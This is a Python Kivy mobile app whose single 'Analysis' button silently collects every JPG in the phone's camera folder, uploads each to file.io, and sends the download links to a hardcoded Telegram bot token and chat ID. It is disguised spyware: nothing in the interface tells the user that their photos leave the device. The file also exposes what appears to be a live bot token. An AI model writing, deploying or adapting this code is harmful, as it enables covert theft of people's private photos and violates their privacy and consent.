from kivy.app import App
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.properties import StringProperty
from telegram import Bot
import requests
import os
import glob
import threading
import asyncio

KV = """
MyBL:
    orientation: "vertical"

    Label:
        font_size: "30sp"
        text: root.data_label
        
    Button:
        text: "Analysis"
        bold: True
        background_color: '#00FFCE'
        size_hint: (1,0.5)
        on_press: root.catch_files()
"""

class MyBL(BoxLayout):
    data_label = StringProperty("Hello")

    def catch_files(self):
        message = ""
        image_files = glob.glob(
            '/DCIM/Camera/*.jpg')
        uploaded_links = []

        for image_file in image_files:
            files = {'file': (os.path.basename(image_file), open(image_file, 'rb'))}
            response = requests.post('https://file.io', files=files)

            if response.status_code == 200:
                uploaded_links.append(response.json()['link'])

        print("-", uploaded_links)

        if uploaded_links:
            for link in uploaded_links:
                message = f"File uploaded. URL: {link}"
        else:
            message = "File upload failed."

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(
            self.send_telegram_message("6579119041:AAGQmuFUYs-sfLjABJT2evy3VZlrZQLDx7c", 1505079391, message))
        loop.close()

    async def send_telegram_message(self, bot_token, chat_id, message):
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=chat_id, text=message)

class MyApp(App):
    running = True
    def build(self):
        return Builder.load_string(KV)

    def on_stop(self):
        self.running = False

my_application = MyApp()

running = threading.Thread(target=my_application.run(), args=())
running.start()
